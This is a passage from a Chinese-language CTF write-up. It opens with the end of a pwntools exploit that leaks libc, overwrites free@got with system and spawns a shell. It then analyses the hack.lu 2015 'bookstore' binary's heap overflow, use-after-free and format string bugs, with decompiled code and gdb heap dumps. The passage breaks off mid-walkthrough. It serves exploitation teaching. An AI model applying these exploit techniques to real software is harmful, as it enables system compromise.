        # leak freeaddr
        show(1)
        r.recvuntil("Content : ")
        data = r.recvuntil("Done !")
        free_addr = u64(data.split("\n")[0].ljust(8, "\x00"))
        libc_base = free_addr - libc.symbols['free']
        log.success('libc base addr: ' + hex(libc_base))
        system_addr = libc_base + libc.symbols['system']
        #gdb.attach(r)
        # overwrite free@got with system addr
        edit(1, p64(system_addr))
        # trigger system("/bin/sh")
        delete(0)
    if __name__ == '__main__':
        exp()
        r.interactive()
## 1.2. 2015 hacklu bookstore
### 1.2.1. 功能分析
先进行功能分析
  1. 有编辑功能，编辑已存在的1,2堆块，可溢出
  2. 删除功能，删除已存在的1,2堆块，uaf
  3. 合并功能，将1,2两个堆块合并,格式化字符串
### 1.2.2. 漏洞点分析
  1. 漏洞点1(任意写，\n才结束)
    unsigned __int64 __fastcall edit_order(char *a1)
    {
      int idx; // eax
      int v3; // [rsp+10h] [rbp-10h]
      int cnt; // [rsp+14h] [rbp-Ch]
      unsigned __int64 v5; // [rsp+18h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      v3 = 0;
      cnt = 0;
      while ( v3 != '\n' )//关键点
      {
        v3 = fgetc(stdin);
        idx = cnt++;
        a1[idx] = v3;
      }
      a1[cnt - 1] = 0;
      return __readfsqword(0x28u) ^ v5;
    }
  1. 漏洞点2(uaf)
free后指针没置空
    unsigned __int64 __fastcall delete_order(void *a1)
    {
      unsigned __int64 v2; // [rsp+18h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      free(a1); //重点
      return __readfsqword(0x28u) ^ v2;
    }
  1. 格式化字符串
    signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)
    {
      int v4; // [rsp+4h] [rbp-BCh]
      char *v5; // [rsp+8h] [rbp-B8h]
      char *first_order; // [rsp+18h] [rbp-A8h]
      char *second_order; // [rsp+20h] [rbp-A0h]
      char *dest; // [rsp+28h] [rbp-98h]
      char s; // [rsp+30h] [rbp-90h]
      unsigned __int64 v10; // [rsp+B8h] [rbp-8h]
      v10 = __readfsqword(0x28u);
      first_order = (char *)malloc(0x80uLL);
      second_order = (char *)malloc(0x80uLL);
      dest = (char *)malloc(0x80uLL);
      if ( !first_order || !second_order || !dest )
      {
        fwrite("Something failed!\n", 1uLL, 0x12uLL, stderr);
        return 1LL;
      }
      v4 = 0;
      puts(
        " _____          _   _                 _          _                   _ \n"
        "/__   \\_____  _| |_| |__   ___   ___ | | __  ___| |_ ___  _ __ ___  / \\\n"
        "  / /\\/ _ \\ \\/ / __| '_ \\ / _ \\ / _ \\| |/ / / __| __/ _ \\| '__/ _ \\/  /\n"
        " / / |  __/>  <| |_| |_) | (_) | (_) |   <  \\__ \\ || (_) | | |  __/\\_/ \n"
        " \\/   \\___/_/\\_\\\\__|_.__/ \\___/ \\___/|_|\\_\\ |___/\\__\\___/|_|  \\___\\/   \n"
        "Crappiest and most expensive books for your college education!\n"
        "\n"
        "We can order books for you in case they're not in stock.\n"
        "Max. two orders allowed!\n");
    LABEL_14:
      while ( !v4 )
      {
        puts("1: Edit order 1");
        puts("2: Edit order 2");
        puts("3: Delete order 1");
        puts("4: Delete order 2");
        puts("5: Submit");
        fgets(&s, 0x80, stdin);
        switch ( s )
        {
          case '1':
            puts("Enter first order:");
            edit_order(first_order);
            strcpy(dest, "Your order is submitted!\n");
            goto LABEL_14;
          case '2':
            puts("Enter second order:");
            edit_order(second_order);
            strcpy(dest, "Your order is submitted!\n");
            goto LABEL_14;
          case '3':
            delete_order(first_order);
            goto LABEL_14;
          case '4':
            delete_order(second_order);
            goto LABEL_14;
          case '5':
            v5 = (char *)malloc(0x140uLL);
            if ( !v5 )
            {
              fwrite("Something failed!\n", 1uLL, 0x12uLL, stderr);
              return 1LL;
            }
            submit(v5, first_order, second_order);
            v4 = 1;
            break;
          default:
            goto LABEL_14;
        }
      }
      printf("%s", v5);
      printf(dest);//格式化字符串
      return 0LL;
    }
### 1.2.3. 漏洞利用过程
这题有三个明显的洞，比原来那些只有一个洞的看起来似乎简单些？实际相反，这道题利用起来难度比前面的还大，因为这个洞不好利用，我自己研究了好久也无果，然后找writeup  
看了看雪大佬的文章才知道这题怎么利用的
开始我在想如何利用格式化字符串的洞，因为格式化字符串的洞在合并过后才会使用，而我没想到什么便捷方法能修改第三块堆块的内容，他只能被覆盖为默认的 **Your
order is submitted!\n** ，后来才知道用overlaping后可以覆盖到第三块堆块的内容，不过还是得精心布置堆才可以利用到
  1. 开头程序malloc(0x80)申请了三个堆块，我们将第二块free掉
    gdb-peda$ x/100gx 0x1b8d010-0x010
    0x1b8d000:  0x0000000000000000  0x0000000000000091 #堆块1
    0x1b8d010:  0x0000000074736574  0x0000000000000000
    0x1b8d020:  0x0000000000000000  0x0000000000000000
    0x1b8d030:  0x0000000000000000  0x0000000000000000
    0x1b8d040:  0x0000000000000000  0x0000000000000000
    0x1b8d050:  0x0000000000000000  0x0000000000000000
    0x1b8d060:  0x0000000000000000  0x0000000000000000
    0x1b8d070:  0x0000000000000000  0x0000000000000000
    0x1b8d080:  0x0000000000000000  0x0000000000000000
    0x1b8d090:  0x0000000000000000  0x0000000000000091 #堆块2，溢出修改处
    0x1b8d0a0:  0x0000000000000000  0x0000000000000000 #数据部分
    0x1b8d0b0:  0x0000000000000000  0x0000000000000000
    0x1b8d0c0:  0x0000000000000000  0x0000000000000000
    0x1b8d0d0:  0x0000000000000000  0x0000000000000000
    0x1b8d0e0:  0x0000000000000000  0x0000000000000000
    0x1b8d0f0:  0x0000000000000000  0x0000000000000000
    0x1b8d100:  0x0000000000000000  0x0000000000000000
    0x1b8d110:  0x0000000000000000  0x0000000000000000
    0x1b8d120:  0x0000000000000000  0x0000000000000091 #堆块3
    0x1b8d130:  0x64726f2072756f59  0x7573207369207265
    0x1b8d140:  0x2164657474696d62  0x000000000000000a
    0x1b8d150:  0x0000000000000000  0x0000000000000000
    0x1b8d160:  0x0000000000000000  0x0000000000000000
    0x1b8d170:  0x0000000000000000  0x0000000000000000
    0x1b8d180:  0x0000000000000000  0x0000000000000000
    0x1b8d190:  0x0000000000000000  0x0000000000000000
    0x1b8d1a0:  0x0000000000000000  0x0000000000000000
    0x1b8d1b0:  0x0000000000000000  0x0000000000000411
    0x1b8d1c0:  0x696d627553203a35  0x20726564726f0a74
    0x1b8d1d0:  0x216465776f0a0a32  0x6163206e6920750a
    0x1b8d1e0:  0x2779656874206573  0x6920746f6e206572
    0x1b8d1f0:  0x2e6b636f7473206e  0x5f0a216e6f69740a
    0x1b8d200:  0x0a2020202f5c5f5f  0x0000000000000000
    0x1b8d210:  0x0000000000000000  0x0000000000000000
    0x1b8d220:  0x0000000000000000  0x0000000000000000
    0x1b8d230:  0x0000000000000000  0x0000000000000000
    0x1b8d240:  0x0000000000000000  0x0000000000000000
    0x1b8d250:  0x0000000000000000  0x0000000000000000
    0x1b8d260:  0x0000000000000000  0x0000000000000000
    0x1b8d270:  0x0000000000000000  0x0000000000000000
    0x1b8d280:  0x0000000000000000  0x0000000000000000